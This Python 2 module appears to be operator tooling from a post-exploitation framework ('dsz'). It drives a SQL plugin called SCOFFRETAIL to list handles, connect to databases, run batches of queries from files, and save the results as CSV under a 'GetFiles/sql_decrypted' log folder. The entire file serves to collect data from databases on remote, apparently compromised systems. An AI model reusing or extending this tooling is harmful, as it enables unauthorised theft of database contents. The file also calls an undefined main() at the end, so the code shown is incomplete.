
import glob
import os
from string import Template
import dsz
import dsz.lp
from dsz.data import BaseTask
import ops.menu
import sql_xml_parser
UNSET = '<Unset>'

def handle_list(echo=False):
    echo_fun = (dsz.control.echo.On if echo else dsz.control.echo.Off)
    echo_fun()
    (status, id) = dsz.cmd.RunEx('sql -action handles', dsz.RUN_FLAG_RECORD)
    echo_fun = (dsz.control.echo.Off if echo else dsz.control.echo.On)
    echo_fun()
    if (not status):
        dsz.ui.Echo("Couldn't retrieve handle list. Is SCOFFRETAIL installed?", dsz.ERROR)
        return None
    handles = dsz.cmd.data.Get('handlesitem::handleitem', dsz.TYPE_OBJECT)
    handle_info = []
    for handle in handles:
        id = dsz.cmd.data.ObjectGet(handle, 'handleid', dsz.TYPE_INT)[0]
        connection_string = dsz.cmd.data.ObjectGet(handle, 'connectionstring', dsz.TYPE_STRING)[0]
        handle_info.append((id, connection_string))
    return handle_info

def driver_list(echo=False):
    echo_fun = (dsz.control.echo.On if echo else dsz.control.echo.Off)
    echo_fun()
    (status, id) = dsz.cmd.RunEx('sql -action drivers', dsz.RUN_FLAG_RECORD)
    echo_fun = (dsz.control.echo.Off if echo else dsz.control.echo.On)
    echo_fun()
    if (not status):
        dsz.ui.Echo("Couldn't retrieve driver list. Is SCOFFRETAIL installed?", dsz.ERROR)
        return None
    drivers = dsz.cmd.data.Get('driversitem::driveritem', dsz.TYPE_OBJECT)
    names = [dsz.cmd.data.ObjectGet(driver, 'name', dsz.TYPE_STRING)[0] for driver in drivers]
    return names

def connect_to_database(connection_string):
    dsz.cmd.Run(('sql -action connect -connectstring "%s"' % connection_string), dsz.RUN_FLAG_RECORD)
    try:
        handle_id = dsz.cmd.data.Get('connection::handleid', dsz.TYPE_INT)[0]
        status = dsz.cmd.data.Get('connection::status', dsz.TYPE_STRING)[0]
        if (status != 'Opened'):
            dsz.ui.Echo(("There was a problem opening the connection, status = '%s'. Check the command logs before continuing!" % status), dsz.WARNING)
        return handle_id
    except RuntimeError as details:
        print details
        return None

def disconnect(handle_id, prompt=True):
    if (not handle_id):
        return
    prompt_string = ('Would you like to disconnect from handle %s?' % handle_id)
    if (prompt and (not dsz.ui.Prompt(prompt_string))):
        return
    dsz.cmd.Run(('sql -action disconnect -handle %s' % int(handle_id)), dsz.RUN_FLAG_RECORD)
    try:
        handle_id = dsz.cmd.data.Get('connection::handleid', dsz.TYPE_INT)[0]
        status = dsz.cmd.data.Get('connection::status', dsz.TYPE_STRING)[0]
        if (status != 'Closed'):
            dsz.ui.Echo('There was a problem closing the handle, check the command logs before continuing!', dsz.WARNING)
        return handle_id
    except RuntimeError as details:
        print details
        return None

def run_folder_of_queries(handle_id, query_folder=None, csv_output=False, max_col_size=64000):
    while (not query_folder):
        prompt = 'Where is the folder of queries to run'
        default_path = os.path.join(dsz.lp.GetLogsDirectory(), 'queries')
        query_folder = dsz.ui.GetString(prompt, default_path)
        if (not os.path.isdir(query_folder)):
            dsz.ui.Echo(('%s does not exist... try again.' % query_folder), dsz.ERROR)
            query_folder = None
    sql_files = os.path.join(query_folder, '*.sql')
    txt_files = os.path.join(query_folder, '*.txt')
    query_files = glob.glob(sql_files)
    query_files += glob.glob(txt_files)
    if (not query_files):
        print ''
        dsz.ui.Echo("Couldn't find any .sql or .txt files in that folder!", dsz.ERROR)
        return
    id_map = {}
    for query_file in query_files:
        if os.path.isdir(query_file):
            continue
        (status, command_id) = run_query_from_file(handle_id, query_file, echo=True, max_col_size=max_col_size)
        if (not status):
            continue
        if csv_output:
            prefix = os.path.splitext(os.path.basename(query_file))[0]
            write_csv_output(command_id, query_folder, prefix)

def write_csv_output(command_id, query_folder, file_prefix):
    output_dir = os.path.join(dsz.lp.GetLogsDirectory(), 'GetFiles', 'sql_decrypted', os.path.basename(query_folder))
    file_name = ('%05d-%s.csv' % (command_id, file_prefix))
    output_file = os.path.join(output_dir, file_name)
    header = sql_xml_parser.header_from_id(command_id)
    data = sql_xml_parser.data_from_id(command_id)
    sql_xml_parser.write(data, header, output_file)

def run_query_from_file(handle_id, query_file=None, echo=True, max_col_size=64000, mapping=None):
    while (not query_file):
        prompt = 'Where is the query file to run'
        query_file = dsz.ui.GetString(prompt)
        if (not os.path.exists(query_file)):
            dsz.ui.Echo(('%s does not exist... try again.' % query_file), dsz.ERROR)
            query_file = None
    with open(query_file, 'rb') as input_handle:
        query = input_handle.read().strip()
        if mapping:
            query = Template(query).safe_substitute(mapping)
        return run_query(handle_id, query, echo, max_col_size)

def run_query(handle_id, query, echo=True, max_col_size=64000):
    echo_fun = (dsz.control.echo.On if echo else dsz.control.echo.Off)
    echo_fun()
    query = query.replace('"', '\\"')
    command = 'background sql -action query -handle %s -maxcolumnsize %s -queryString "%s"'
    command = (command % (handle_id, max_col_size, query))
    print ''
    (status, command_id) = dsz.cmd.RunEx(command, dsz.RUN_FLAG_RECORD)
    task = BaseTask(command_id)
    while task.IsRunning():
        dsz.Sleep(1000)
    dsz.ui.Echo(('Query complete, command ID: %s' % command_id), dsz.GOOD)
    echo_fun = (dsz.control.echo.Off if echo else dsz.control.echo.On)
    echo_fun()
    return (status, command_id)

def select_driver_menu(menu):
    driver_name = ''
    driver_menu = ops.menu.Menu()
    driver_menu.set_heading('Please select a driver from the list...')
    for driver_name in driver_list():
        driver_menu.add_option(driver_name)
    result = driver_menu.execute(exit='Go Back...', menuloop=False)
    if (result['selection'] == 0):
        driver_name = UNSET
    else:
        driver_name = result['option']
    menu.set_current_state(driver_name)
if (__name__ == '__main__'):
    main()